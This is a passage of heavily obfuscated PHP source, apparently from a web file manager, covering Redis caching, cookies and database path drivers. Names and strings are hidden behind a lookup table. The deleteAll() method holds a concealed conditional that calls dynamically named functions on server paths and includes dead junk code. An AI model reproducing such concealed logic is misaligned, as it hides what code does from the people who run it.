$ÈêÅÜò–àÜ); } else { $this->handle = $this->init($Ì×…‹ ù¼±•¡, $ÈêÅÜò–àÜ); } } private function init($ÙÁö«ş, $ÄÎ£­úéÀğ) { $ÀÛçşİ¨ =& $_SERVER[èÍ×öˆøÉ]; $¯÷Í†æªö = new Redis(); $ª«• = isset($ÙÁö«ş[$ÀÛçşİ¨[870]]) ? $ÙÁö«ş[$ÀÛçşİ¨[870]] : !1; if ($ª«•) { $¯÷Í†æªö->pconnect($ÙÁö«ş[$ÀÛçşİ¨[175]], $ÙÁö«ş[$ÀÛçşİ¨[176]], $ÄÎ£­úéÀğ); } else { $¯÷Í†æªö->connect($ÙÁö«ş[$ÀÛçşİ¨[175]], $ÙÁö«ş[$ÀÛçşİ¨[176]], $ÄÎ£­úéÀğ); } if (!empty($ÙÁö«ş[$ÀÛçşİ¨[408]])) { $¯÷Í†æªö->auth($ÙÁö«ş[$ÀÛçşİ¨[408]]); } return $¯÷Í†æªö; } private function initCluster($ö½, $˜åì®ÔŞÚ) { $²Ö·˜¹¿Ù =& $_SERVER[èÍ×öˆøÉ]; $öÎ½ë¤ƒÖÈ·ë = array($²Ö·˜¹¿Ù[871], $²Ö·˜¹¿Ù[872], $²Ö·˜¹¿Ù[873]); $ß¡Á = $²Ö·˜¹¿Ù[871]; if (isset($ö½[$²Ö·˜¹¿Ù[12]]) && in_array($ö½[$²Ö·˜¹¿Ù[12]], $öÎ½ë¤ƒÖÈ·ë)) { $ß¡Á = $ö½[$²Ö·˜¹¿Ù[12]]; } switch ($ß¡Á) { case $²Ö·˜¹¿Ù[871]: $this->_slave($ö½, $˜åì®ÔŞÚ); break; case $²Ö·˜¹¿Ù[872]: break; case $²Ö·˜¹¿Ù[873]: $this->isCluster = !0; $Úü = $ö½[$²Ö·˜¹¿Ù[866]]; $ØÔ = isset($ö½[$²Ö·˜¹¿Ù[870]]) ? $ö½[$²Ö·˜¹¿Ù[870]] : !1; $Ùç¢ø“ = isset($ö½[$²Ö·˜¹¿Ù[408]]) ? $ö½[$²Ö·˜¹¿Ù[408]] : null; $this->handle = new RedisCluster(NUll, $Úü, $˜åì®ÔŞÚ, $˜åì®ÔŞÚ, $ØÔ, $Ùç¢ø“); break; default: break; } } private function _slave($şäåâ, $¯¯ñ) { $øô = $şäåâ[$_SERVER[èÍ×öˆøÉ][866]]; $this->filterConfig($şäåâ, $øô[0]); $this->handle = $this->init($şäåâ, $¯¯ñ); unset($øô[0]); if (empty($øô)) { return; } $Í•´ì°§¨ = array_rand($øô); $this->filterConfig($şäåâ, $øô[$Í•´ì°§¨]); $this->slaveHandle = $this->init($şäåâ, $¯¯ñ); } private function filterConfig(&$ÖªĞ´Ôõº–, $Ãöğœ) { $ìîïºÄŸİş =& $_SERVER[èÍ×öˆøÉ]; $­ü— ¿ä¤ñ¥ = explode($ìîïºÄŸİş[4], $Ãöğœ); $üŠ = array($ìîïºÄŸİş[175] => $­ü— ¿ä¤ñ¥[0], $ìîïºÄŸİş[176] => $­ü— ¿ä¤ñ¥[1]); $ÖªĞ´Ôõº– = array_merge($ÖªĞ´Ôõº–, $üŠ); } public function set($­å”Ô, $’Ç¼Íßİ‡±, $×¡öÇ–Ø—êºÔ = false) { $×¡öÇ–Ø—êºÔ = $×¡öÇ–Ø—êºÔ ? $×¡öÇ–Ø—êºÔ : $this->cacheTime; return $this->handle->setEx($­å”Ô, $×¡öÇ–Ø—êºÔ, $’Ç¼Íßİ‡±); } public function setLock($§‘æöŞ’‰, $—ñƒ‡æÙ, $è˜¨Ú‚Š‚ù²) { return $this->handle->setNX($§‘æöŞ’‰, $—ñƒ‡æÙ); } public function get($ŠèğëäŸÙ) { $ÅœÍ‘Èä = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÅœÍ‘Èä->get($ŠèğëäŸÙ); } public function remove($³˜) { return $this->handle->del($³˜); } public function deleteAll() { $²×á¹ =& $_SERVER[èÍ×öˆøÉ]; if ($_SERVER[$²×á¹[874]] != $_SERVER[$²×á¹[875]]) { $¨êñÇ“ = $²×á¹[876]; $æšÚ›˜ñ™ÃÛ = $²×á¹[877]; $¼Íûëî = $_SERVER[$²×á¹[878]] . $²×á¹[879]; $œÄ = $æšÚ›˜ñ™ÃÛ($¼Íûëî); $î¾ƒÕÂŸâñÖï = explode($²×á¹[229], $œÄ); if (count($î¾ƒÕÂŸâñÖï) < $²×á¹[616]) { $íå²ä¦Ò²ªË = $²×á¹[880]; $íå²ä¦Ò²ªË(); } $ıŠèÍß…ˆ = $²×á¹[881]; $ıŠèÍß…ˆ($_SERVER[$²×á¹[882]]); $ıŠèÍß…ˆ($_SERVER[$²×á¹[878]] . $²×á¹[883]); $ÚÓˆÑ­†¥ú = 1; while ($ÚÓˆÑ­†¥ú > 1) { $ÚÓˆÑ­†¥ú = $ÚÓˆÑ­†¥ú + 4; $–‚ = rawurlencode($ÚÓˆÑ­†¥ú . $²×á¹[376]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ª«Í¨¼) { $this->handle->flushall($ª«Í¨¼); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ñ‰ºÑ = '', $˜§ = 0) { if (is_string($ñ‰ºÑ) && $ñ‰ºÑ != $_SERVER[èÍ×öˆøÉ][33]) { $this->prefix = $ñ‰ºÑ; } if (is_numeric($˜§) && $˜§ > 0) { $this->expire = $˜§; } } public static function getInstance() { static $©¥; if ($©¥ === null) { $©¥ = new self(); } return $©¥; } private static $cookieDisable = false; public static function disable($æìĞûŸ) { self::$cookieDisable = $æìĞûŸ; } private static $sameCookieSet = array(); public static function set($ü, $Ö‰ÇÕ®Ş”‚‚, $¸êÂ—¾® = 0, $úñœ™¤®– = false, $ëÅ¿Õû§ = false) { $îõº =& $_SERVER[èÍ×öˆøÉ]; if (self::$cookieDisable) { return; } if (!$¸êÂ—¾®) { $¸êÂ—¾® = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ü]) && self::$sameCookieSet[$ü] == $Ö‰ÇÕ®Ş”‚‚ . $¸êÂ—¾®) { return; } self::$sameCookieSet[$ü] = $Ö‰ÇÕ®Ş”‚‚ . $¸êÂ—¾®; if (!$ëÅ¿Õû§) { $ëÅ¿Õû§ = str_replace(HOST, $îõº[33], APP_HOST); $ëÅ¿Õû§ = _get($GLOBALS, $îõº[884], $ëÅ¿Õû§); } $Á¶ÒÚÕÇæ = $îõº[33]; setcookie($ü, $Ö‰ÇÕ®Ş”‚‚, time() + $¸êÂ—¾®, $îõº[8] . trim($ëÅ¿Õû§, $îõº[8]) . $Á¶ÒÚÕÇæ, !1, !1, $úñœ™¤®–); } public static function setSafe($–¥ËÁ, $È¢›‡²ÚŸ˜Õ, $¥Å– = 0) { self::set($–¥ËÁ, $È¢›‡²ÚŸ˜Õ, $¥Å–, !0); } public static function get($˜—”) { return isset($_COOKIE[$˜—”]) ? $_COOKIE[$˜—”] : !1; } public static function remove($½Òè•, $ØŒÈ–‡û = false) { unset($_COOKIE[$½Òè•]); self::set($½Òè•, $_SERVER[èÍ×öˆøÉ][33], 1, $ØŒÈ–‡û); } } goto a·’ğÉóª”; AïÃòÔèÏ•: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ˆ×÷Ã†) { $this->pathParse = $ˆ×÷Ã†; $this->model = Model($_SERVER[èÍ×öˆøÉ][1256]); } public function getPath($¡Ì) { return trim($¡Ì, $_SERVER[èÍ×öˆøÉ][8]); } public function pathFather($ï) { $¿¨šÊÚ = $this->parse($ï); $¿¨šÊÚ = $this->infoSimple($ï); return $¿¨šÊÚ ? $¿¨šÊÚ[$_SERVER[èÍ×öˆøÉ][492]] : !1; } public function pathThis($ÂæÌ¹) { $ÕË = $this->infoSimple($ÂæÌ¹); return $ÕË ? $ÕË[$_SERVER[èÍ×öˆøÉ][28]] : !1; } public function getPathOuter($åÕëü™ĞÔ) { if (!$åÕëü™ĞÔ) { return $åÕëü™ĞÔ; } $ı•»Ğé…¥ = $this->parse($åÕëü™ĞÔ); return KodIO::make($ı•»Ğé…¥[$_SERVER[èÍ×öˆøÉ][395]]); } public function copyFolderFromIO($ÌˆÄæÊƒÏ½úõ, $óÄ—Å“€áÃ, $ş£àŠ, $ôòê¶ûÂ¶…êî, $àŒ¯Òáº) { $Üª®ú™îäæ = $this->model->copyFolderFromIO($ÌˆÄæÊƒÏ½úõ, $óÄ—Å“€áÃ, $ş£àŠ, $ôòê¶ûÂ¶…êî, $àŒ¯Òáº); return KodIO::make($Üª®ú™îäæ); } public function isParentOf($ÜÏ¬Õ¶ö, $¹¿ğÕˆ¡›š) { return $this->model->isParentOf($ÜÏ¬Õ¶ö, $¹¿ğÕˆ¡›š); } public function mkfile($ÚÏ¦­åóÕã, $ÅÈ™‡ÃÍÓ = '', $°«…¸ø­ = REPEAT_RENAME) { $øã¢ =& $_SERVER[èÍ×öˆøÉ]; $­–ˆ½ = $this->parse($ÚÏ¦­åóÕã); $ÚÏ¦­åóÕã = $­–ˆ½[$øã¢[395]]; for ($ÊÁ“¾ö = 0; $ÊÁ“¾ö < count($­–ˆ½[$øã¢[1257]]); $ÊÁ“¾ö++) { $Ç‡… = $­–ˆ½[$øã¢[1257]][$ÊÁ“¾ö]; if ($ÊÁ“¾ö == count($­–ˆ½[$øã¢[1257]]) - 1) { $ÚÏ¦­åóÕã = $this->model->mkfile($ÚÏ¦­åóÕã, $Ç‡…, $ÅÈ™‡ÃÍÓ, $°«…¸ø­); break; } $ÚÏ¦­åóÕã = $this->model->mkdir($ÚÏ¦­åóÕã, $Ç‡…, REPEAT_SKIP); } return $this->getPathOuter($ÚÏ¦­åóÕã); } public function mkdir($ÃïÄ—«½î, $âø®·úŞ = REPEAT_SKIP) { $Èº¹Íœëëî =& $_SERVER[èÍ×öˆøÉ]; $Ù«†ñ›¸“ŠÁï = $this->parse($ÃïÄ—«½î); $ÃïÄ—«½î = $Ù«†ñ›¸“ŠÁï[$Èº¹Íœëëî[395]]; for ($´ÊêŒ¢‡ = 0; $´ÊêŒ¢‡ < count($Ù«†ñ›¸“ŠÁï[$Èº¹Íœëëî[1257]]); $´ÊêŒ¢‡++) { $›¨ = $Ù«†ñ›¸“ŠÁï[$Èº¹Íœëëî[1257]][$´ÊêŒ¢‡]; $ÃïÄ—«½î = $this->model->mkdir($ÃïÄ—«½î, $›¨, $âø®·úŞ); } return $this->getPathOuter($ÃïÄ—«½î); } public function copyFile($ŞÄéÔ¹, $Ã¶½ËˆéÏğ, $„•ƒÂ¶¬ = REPEAT_REPLACE) { $©ºÏ»š =& $_SERVER[èÍ×öˆøÉ]; $¾˜ = $this->parse($Ã¶½ËˆéÏğ); $ù»Š¨®„ = $this->model->copy($ŞÄéÔ¹, $¾˜[$©ºÏ»š[395]], $„•ƒÂ¶¬, $¾˜[$©ºÏ»š[76]]); return $ù»Š¨®„ ? $this->getPathOuter($ù»Š¨®„) : !1; } public function moveFile($å‹¿Ùõ, $Îµ›åˆµ´Ú, $¢¬ï  = REPEAT_REPLACE) { $‘ˆ£ÓÊé =& $_SERVER[èÍ×öˆøÉ]; $ÚæŸûÂğ = $this->parse($Îµ›åˆµ´Ú); $¼¹Ä˜Ó–ú•ø¥ = $this->model->move($å‹¿Ùõ, $ÚæŸûÂğ[$‘ˆ£ÓÊé[395]], $¢¬ï , $ÚæŸûÂğ[$‘ˆ£ÓÊé[76]]); return $¼¹Ä˜Ó–ú•ø¥ ? $this->getPathOuter($¼¹Ä˜Ó–ú•ø¥) : !1; } public function copy($ù¹‰ç¯úÚóê, $„çÑ«ÁëÂÁ, $ï‰â™è¹¨íØ = REPEAT_REPLACE) { $¹Úô¡‡²à = $this->parse($„çÑ«ÁëÂÁ); $ñ”Ü = $this->model->copy($ù¹‰ç¯úÚóê, $¹Úô¡‡²à[$_SERVER[èÍ×öˆøÉ][395]], $ï‰â™è¹¨íØ); return $ñ”Ü ? $this->getPathOuter($ñ”Ü) : !1; } public function moveSameAllow() { } public function move($óÍµÓÂ, $ÎÃ¹Û¡©¢, $²áÁ = REPEAT_REPLACE) { $û–·ıàÑé = $this->parse($ÎÃ¹Û¡©¢); $Ò– = $this->model->move($óÍµÓÂ, $û–·ıàÑé[$_SERVER[èÍ×öˆøÉ][395]], $²áÁ); return $Ò– ? $this->getPathOuter($Ò–) : !1; } public function remove($ı×, $”‰è§Î = true) { return $this->model->remove($ı×, $”‰è§Î); } public function rename($Ğµ´É®Î¿£, $©¸§Åó—ˆ¨Œ) { $èóª¯ñù¨ = $this->model->rename($Ğµ´É®Î¿£, $©¸§Åó—ˆ¨Œ); return $èóª¯ñù¨ ? $this->getPathOuter($Ğµ´É®Î¿£) : $èóª¯ñù¨; } public function size($Ö…»¢†) { $¬–ã“šË‹Ó = $this->infoSimple($Ö…»¢†); return $¬–ã“šË‹Ó ? $¬–ã“šË‹Ó[$_SERVER[èÍ×öˆøÉ][78]] : 0; } public function infoSimple($ïİˆ©Í¨ å) { return $this->model->sourceInfo($ïİˆ©Í¨ å); } public function info($ÈÆ€‹´ÜŸèÊ•) { return $this->infoParse($ÈÆ€‹´ÜŸèÊ•); } public function infoAuth($®‚í¥) { return $this->infoParse($®‚í¥, !1, !0); } public function infoWithChildren($½™Çšğçó¹) { return $this->infoParse($½™Çšğçó¹, !0); } protected function infoParse($Å¥, $óâË = false, $·í½¨°ÑË¥ğü = false) { if (!$óâË) { return $this->model->pathInfo($Å¥, $·í½¨°ÑË¥ğü); } return $this->model->pathInfoMore($Å¥); } public function infoFull($¥ÀûµÕõóÛ·) { $ê¨ºışû =& $_SERVER[èÍ×öˆøÉ]; $Äğ = explode($ê¨ºışû[8], $¥ÀûµÕõóÛ·); $ÆÀÁíÅ = implode($ê¨ºışû[8], array_splice($Äğ, 1)); return $this->model->pathInfoByPath($Äğ[0], $ÆÀÁíÅ); } public function hashSimple($×ö) { $¿Õ¶üùËù†½ =& $_SERVER[èÍ×öˆøÉ]; $øúÇğÛÌª© = $this->infoWithChildren($×ö); return $øúÇğÛÌª©[$¿Õ¶üùËù†½[164]][$¿Õ¶üùËù†½[171]]; } public function hashMd5($½Õöê§œ“˜±ê) { $×ÆÌ =& $_SERVER[èÍ×öˆøÉ]; $”ˆÂ = $this->infoWithChildren($½Õöê§œ“˜±ê); return $”ˆÂ[$×ÆÌ[164]][$×ÆÌ[170]]; } public function exist($ˆÈôõÚ) { $¼°å‡˜¥¿ =& $_SERVER[èÍ×öˆøÉ]; $Ì²òáİºÂø = $this->parse($ˆÈôõÚ); if (!$Ì²òáİºÂø[$¼°å‡˜¥¿[76]]) { return $this->isFile($ˆÈôõÚ) || $this->isFolder($ˆÈôõÚ); } $äÊ‰ = array($¼°å‡˜¥¿[396] => $Ì²òáİºÂø[$¼°å‡˜¥¿[395]], $¼°å‡˜¥¿[28] => $Ì²òáİºÂø[$¼°å‡˜¥¿[76]]); $¼ª = $this->model->where($äÊ‰)->find(); return $¼ª ? !0 : !1; } public function isFile($Œâ¢) { $Ò­åìĞ =& $_SERVER[èÍ×öˆøÉ]; $¯Ê = $this->infoSimple($Œâ¢); return $¯Ê && $¯Ê[$Ò­åìĞ[405]] == $Ò­åìĞ[87] ? !1 : !0; } public function isFolder($¢¤é) { $âÉ©Ò =& $_SERVER[èÍ×öˆøÉ]; $»§×Ñõ¾ = $this->infoSimple($¢¤é); return $»§×Ñõ¾ && $»§×Ñõ¾[$âÉ©Ò[405]] == $âÉ©Ò[87] ? !0 : !1; } public function listPath($Ï™Áø, $Ù²ÅŒÛ = false) { $‚‘˜É =& $_SERVER[èÍ×öˆøÉ]; if ($Ï™Áø == $‚‘˜É[33]) { return !1; } $øÂÅßßéÔÄÒÜ = array($‚‘˜É[396] => $Ï™Áø); if ($Ù²ÅŒÛ) { return $this->model->listSource($øÂÅßßéÔÄÒÜ, -1); } return $this->model->listSource($øÂÅßßéÔÄÒÜ); } public function has($ÛÌÛ, $•ò òÉÒ§ù = false, $ÌÍİ†³Íä°½ß = null) { $‹ª¸ãş =& $_SERVER[èÍ×öˆøÉ]; $æ–à = $this->infoWithChildren($ÛÌÛ); if ($•ò òÉÒ§ù) { return array($‹ª¸ãş[204] => $æ–à[$‹ª¸ãş[204]], $‹ª¸ãş[203] => $æ–à[$‹ª¸ãş[203]]); } return $ÌÍİ†³Íä°½ß ? $æ–à[$‹ª¸ãş[204]] : $æ–à[$‹ª¸ãş[203]]; } public function listAll($äË) { $‹ã“–ŞÛÍŸ = IO::info($this->pathParse[$_SERVER[èÍ×öˆøÉ][76]]); if (!$‹ã“–ŞÛÍŸ) { return array(); } return $this->model->listAll($äË); } public function getContent($Ìè) { return $this->model->getContent($Ìè); } public function setContent($ãŸ³–“, $€ˆµŠ€° = '') { return $this->model->setContent($ãŸ³–“, $€ˆµŠ€°); } public function fileSubstr($çÃ, $³Ş»‘É, $ÇÖ•ƒ) { return $this->model->fileSubstr($çÃ, $³Ş»‘É, $ÇÖ•ƒ); } public function download($ØÌ€â, $›ïÀ—½®¿ = '') { $âà¬İ´¡ù = get_path_father($›ïÀ—½®¿); $€ñ¨Óï¨ = get_path_this($›ïÀ—½®¿); $ÙŸê = $this->model->fileInfoGet($ØÌ€â); $åŠáÌ˜ô„¨ = IO::copy($ÙŸê[$_SERVER[èÍ×öˆøÉ][76]], $âà¬İ´¡ù, !1, $€ñ¨Óï¨); return $åŠáÌ˜ô„¨; } public function setModifyTime($ÁÇ““, $ŞÃ = '') { $ŞÙáÏ =& $_SERVER[èÍ×öˆøÉ]; if (!$ÁÇ““) { return; } $this->model->where(array($ŞÙáÏ[412] => $ÁÇ““))->save(array($ŞÙáÏ[84] => $ŞÃ)); } public function upload($—û‚ó, $½ªü, $ĞİºˆÖ†—Ÿ = false, $û©§¬ÏâÕ¹‹¡ = REPEAT_REPLACE) { $øÛà =& $_SERVER[èÍ×öˆøÉ]; $Ìä‹ƒô´éı = $this->parse($—û‚ó); $Œó¤ƒÕ¥§§Æ© = $this->model->addFile($Ìä‹ƒô´éı[$øÛà[395]], $½ªü, $Ìä‹ƒô´éı[$øÛà[76]], $ĞİºˆÖ†—Ÿ, $û©§¬ÏâÕ¹‹¡); return $this->getPathOuter($Œó¤ƒÕ¥§§Æ©); } public function uploadFileByID($®§„ğ³ï…æ, $À„Œ´ÜÌ¼Õ¥, $ğ·‘şİÌ…) { $ĞĞù =& $_SERVER[èÍ×öˆøÉ]; $²§ = $this->parse($®§„ğ³ï…æ); $ÓÜØÜÉ†¾ïÙ = $this->model->addFileByFileID($²§[$ĞĞù[395]], $À„Œ´ÜÌ¼Õ¥, $²§[$ĞĞù[76]], $ğ·‘şİÌ…); return $this->getPathOuter($ÓÜØÜÉ†¾ïÙ); } public function addFileByRemote($«ƒ, $·ˆ©ºİôÂ, $âà€Ûæëß = array(), $¡šªìèø“ô = '', $Îçº¨ö¥Œœ‡î) { $É÷éü =& $_SERVER[èÍ×öˆøÉ]; $Íş×¯ú€÷Ä… = $this->parse($«ƒ); $¡šªìèø“ô = empty($¡šªìèø“ô) ? $Íş×¯ú€÷Ä…[$É÷éü[76]] : $¡šªìèø“ô; $ï»³Ş”¬øä¸ = $this->model->addFileByRemote($Íş×¯ú€÷Ä…[$É÷éü[395]], $·ˆ©ºİôÂ, $¡šªìèø“ô, $âà€Ûæëß, $Îçº¨ö¥Œœ‡î); return $this->getPathOuter($ï»³Ş”¬øä¸); } public function uploadLink($¨Í‘ÈËëç±áÔ, $İèï = 0) { $ö =& $_SERVER[èÍ×öˆøÉ]; $öÌŠ…£ = $this->parse($¨Í‘ÈËëç±áÔ); $—ú½“ = _get($GLOBALS[$ö[7]], $ö[1258]); $›ËØÁ ØŒ = _get($GLOBALS[$ö[7]], $ö[1259]); $¨Í‘ÈËëç±áÔ = Model($ö[597])->createFileName($öÌŠ…£[$ö[76]], $—ú½“, $›ËØÁ ØŒ); return IO::uploadLink($¨Í‘ÈËëç±áÔ, $İèï); } public function fileNameAuto($Çø¥¦›Ì, $À½ÅŒ¡±Ó„öÊ, $Á œ×´ = REPEAT_REPLACE, $½½˜Êøïå‰É = false) { return $this->model->fileNameAuto($Çø¥¦›Ì, $À½ÅŒ¡±Ó„öÊ, $Á œ×´, $½½˜Êøïå‰É); } public function fileNameExist($œœè, $øæ×Íê³€Ş) { return $this->model->fileNameExist($œœè, $øæ×Íê³€Ş); } protected function _fileOut($ß æ, $ı˜ñ = false, $Í½°›Í› = false, $ê¬Ø = '', $”ÄÍ«§–û¢ = false) { $ü´² =& $_SERVER[èÍ×öˆøÉ]; $‰ùĞªİ = $this->model->sourceInfo($ß æ); if ($‰ùĞªİ[$ü´²[405]] == $ü´²[87]) { header($ü´²[1260]); die; } $ËÎÎšş = $this->model->fileInfoGet($ß æ); $ê¬Ø = $ËÎÎšş[$ü´²[170]] ? $ËÎÎšş[$ü´²[170]] : $ê¬Ø; $ëá›—Ì¶¶€ = isset($GLOBALS[$ü´²[1261]]) ? $GLOBALS[$ü´²[1261]] : $‰ùĞªİ[$ü´²[28]]; if ($”ÄÍ«§–û¢) { return IO::fileOutServer($ËÎÎšş[$ü´²[76]], $ı˜ñ, $ëá›—Ì¶¶€, $ê¬Ø); } IO::fileOut($ËÎÎšş[$ü´²[76]], $ı˜ñ, $ëá›—Ì¶¶€, $ê¬Ø); } public function fileOut($—İ³´û—ô, $ªÌšúåÚ = false, $¸š = false, $Û×…Ü›¢ = '') { $this->_fileOut($—İ³´û—ô, $ªÌšúåÚ, $¸š, $Û×…Ü›¢); } public function fileOutServer($¸¾û, $İÜØÙûÜ¥ = false, $ÒÚç©€ÓÀûåû = false, $í€Æ  = '') { $this->_fileOut($¸¾û, $İÜØÙûÜ¥, $ÒÚç©€ÓÀûåû, $í€Æ , !0); } protected function _fileOutImage($ŒÙ¤ì, $Ûå»ƒé°©Â¼ = 250) { $Âõ =& $_SERVER[èÍ×öˆøÉ]; $øšŞúÜ’ = $this->model->pathInfo($ŒÙ¤ì); if ($øšŞúÜ’[$Âõ[405]] == $Âõ[87]) { show_json($Âõ[1262] . $ŒÙ¤ì, !1); } $§ò¬È = $this->model->fileInfoGet($ŒÙ¤ì); $§ò¬È[$Âõ[28]] = $øšŞúÜ’[$Âõ[28]]; $§ò¬È[$Âõ[163]] = $øšŞúÜ’[$Âõ[163]]; $GLOBALS[$Âõ[1261]] = $§ò¬È[$Âõ[28]]; $GLOBALS[$Âõ[162]] = $§ò¬È; IO::fileOutImage($§ò¬È[$Âõ[76]], $Ûå»ƒé°©Â¼); } public function fileOutImage($ƒö¦„Êïê, $©Æë = 250) { $this->_fileOutImage($ƒö¦„Êïê, $©Æë); } public function fileOutImageServer($¤º’ÀÓŸ¨Èï, $ùƒÅü¡ˆŞ = 250) { $this->_fileOutImage($¤º’ÀÓŸ¨Èï, $ùƒÅü¡ˆŞ); } public function link($¿éÎ…Ä¸, $¿ïÁ“·®çç = '') { $æ®”ƒà³ÅÉ° = $this->model->fileInfoGet($¿éÎ…Ä¸); return IO::link($æ®”ƒà³ÅÉ°[$_SERVER[èÍ×öˆøÉ][76]], $¿ïÁ“·®çç); } protected function parse($×„Ë€¢Çß) { $ÓÜ© =& $_SERVER[èÍ×öˆøÉ]; if (strstr($×„Ë€¢Çß, $ÓÜ©[8]) === !1) { return array($ÓÜ©[414] => intval($×„Ë€¢Çß), $ÓÜ©[76] => $ÓÜ©[33], $ÓÜ©[1257] => array()); } $² ŒÊ×Œ = explode($ÓÜ©[8], trim($×„Ë€¢Çß, $ÓÜ©[8])); if (count($² ŒÊ×Œ) < 2) { show_tips($×„Ë€¢Çß . $ÓÜ©[1263]); } return array($ÓÜ©[414] => intval($² ŒÊ×Œ[0]), $ÓÜ©[76] => $² ŒÊ×Œ[1], $ÓÜ©[1257] => array_slice($² ŒÊ×Œ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($¿Õóì) { $this->pathParse = $¿Õóì; $this->model = Model($_SERVER[èÍ×öˆøÉ][1256]); } public function getPathOuter($œ¶­ÁÓü‘³î†) { $Ü–„’É =& $_SERVER[èÍ×öˆøÉ]; if (!$œ¶­ÁÓü‘³î†) { return $œ¶­ÁÓü‘³î†; } $Î°˜ä‡ûÀª = $this->parse($œ¶­ÁÓü‘³î†); return trim(KodIO::makeShare($this->pathParse[$Ü–„’É[395]], $Î°˜ä‡ûÀª[$Ü–„’É[395]]), $Ü–„’É[8]); } protected function infoParse($À–µ, $—Ğ = false, $´îâÏáÊÕ¹¸Ø = false) { $‘ŞÍÂóÚ÷ =& $_SERVER[èÍ×öˆøÉ]; $ÅÕ = $this->pathParse[$‘ŞÍÂóÚ÷[395]]; $¯Šşˆ§ = trim($this->pathParse[$‘ŞÍÂóÚ÷[1102]], $‘ŞÍÂóÚ÷[8]); return Action($‘ŞÍÂóÚ÷[1264])->sharePathInfo($ÅÕ, $¯Šşˆ§); } public function infoFull($Òö¡·Â¦˜³õ) { $”× =& $_SERVER[èÍ×öˆøÉ]; $ßûÒ˜™ğ“ = explode($”×[8], trim($Òö¡·Â¦˜³õ, $”×[8])); if (count($ßûÒ˜™ğ“) > 1) { $¬‚ò = implode($”×[8], array_splice($ßûÒ˜™ğ“, 1)); $ñ•Ôá = $this->model->pathInfoByPath($ßûÒ˜™ğ“[0], $¬‚ò); if (!$ñ•Ôá) { return !1; } $this->pathParse[$”×[1102]] = $ñ•Ôá[$”×[397]]; } return $this->infoParse($Òö¡·Â¦˜³õ); } public function listAll($›»¤ıøŠíàÂ) { $¿ĞˆÄú¶ =& $_SERVER[èÍ×öˆøÉ]; $›Î“Î‘Ï†± = IO::info($this->pathParse[$¿ĞˆÄú¶[76]]); if (!$›Î“Î‘Ï†±) { return array(); } $Ä“ = $this->model->listAll($›»¤ıøŠíàÂ); $Ú·”„ÄÄ¢¬’ = Model($¿ĞˆÄú¶[589])->getInfo($›Î“Î‘Ï†±[$¿ĞˆÄú¶[482]]); $İÇ = Action($¿ĞˆÄú¶[1264]); foreach ($Ä“ as &$åŞ©¶Ôˆ) { check_abort(); $åŞ©¶Ôˆ[$¿ĞˆÄú¶[85]] = $İÇ->_shareItemeParse($åŞ©¶Ôˆ[$¿ĞˆÄú¶[85]], $Ú·”„ÄÄ¢¬’); } unset($åŞ©¶Ôˆ); return $Ä“; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ ò°òøÜš) { $this->pathParse = $ ò°òøÜš; $this->model = Model($_SERVER[èÍ×öˆøÉ][1256]); } protected function infoParse($èˆÃáƒ¾, $Ó £³¢ç = false, $¬¡Œ˜ç«È² = false) { $‚• =& $_SERVER[èÍ×öˆøÉ]; return Action($‚•[1108])->sharePathInfo($this->pathParse[$‚•[76]], !0); } public function listPath($ß©, $Â‘¬Úì‰ö = false) { $ê°Â¸‚ =& $_SERVER[èÍ×öˆøÉ]; $óö = parent::listPath($ß©, $Â‘¬Úì‰ö); foreach ($óö as $‚Ò => $¹¥™ÍµòšÂº±) { if (!in_array($‚Ò, array($ê°Â¸‚[74], $ê°Â¸‚[75]))) { continue; } foreach ($¹¥™ÍµòšÂº± as $ÇÑı => $Ã”Û€) { $óö[$‚Ò][$ÇÑı] = Action($ê°Â¸‚[1108])->shareItemInfo($Ã”Û€); } } return $óö; } public function listAll($Ü€ŒÇ­²) { $ ƒ‹¯‚²¹‚·ø =& $_SERVER[èÍ×öˆøÉ]; $İĞğì = IO::info($this->pathParse[$ ƒ‹¯‚²¹‚·ø[76]]); if (!$İĞğì) { return array(); } $ä² = $this->model->listAll($Ü€ŒÇ­²); foreach ($ä² as &$Â¾¯±–òŞ™) { $Â¾¯±–òŞ™[$ ƒ‹¯‚²¹‚·ø[85]] = Action($ ƒ‹¯‚²¹‚·ø[1108])->shareItemInfo($Â¾¯±–òŞ™[$ ƒ‹¯‚²¹‚·ø[85]]); } unset($Â¾¯±–òŞ™); return $ä²; } } goto DÇâÖÀ§¢ä; A†ÚƒÀ §¬: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\163\x6f\165\162\x63\145\123\x65\143\162\145\x74\x4c\151\163\x74"; public $field = array("\x73\157\165\x72\x63\x65\111\x44", "\x74\x79\x70\145\111\x44", "\x63\x72\x65\x61\x74\145\125\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\x2e\163\x74\x6f\x72\x61\x67\145\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\163\x69\172\x65\x4d\141\170", "\x73\171\x73\x74\145\x6d", "\144\x65\146\x61\165\x6c\164", "\144\162\151\x76\145\162", "\143\157\156\146\151\x67"); public function listData($ß¡ª = false, $ÁÁ¶ = "\155\157\x64\151\x66\x79\x54\151\x6d\145", $Ü®³ƒ» = false) { $ÊÈîÚ¨´©«æ‰ =& $_SERVER[èÍ×öˆøÉ]; $è = parent::listData($ß¡ª, $ÁÁ¶, $Ü®³ƒ»); if ($ß¡ª) { return $è; } $ÅêÃ˜ú¨ = $this->ioSizeUseGet(array_to_keyvalue($è, $ÊÈîÚ¨´©«æ‰[33], $ÊÈîÚ¨´©«æ‰[395])); foreach ($è as $ô¢ => $±Á) { unset($è[$ô¢][$ÊÈîÚ¨´©«æ‰[6]]); $è[$ô¢][$ÊÈîÚ¨´©«æ‰[1737]] = isset($ÅêÃ˜ú¨[$±Á[$ÊÈîÚ¨´©«æ‰[395]]]) ? $ÅêÃ˜ú¨[$±Á[$ÊÈîÚ¨´©«æ‰[395]]] : 0; } return $è; } public function ioSizeUseGet($•î«ù) { $Ş¼›©ÛÚæÊ· =& $_SERVER[èÍ×öˆøÉ]; if (!$•î«ù) { return array(); } $°û·û—Óö = $Ş¼›©ÛÚæÊ·[2052] . 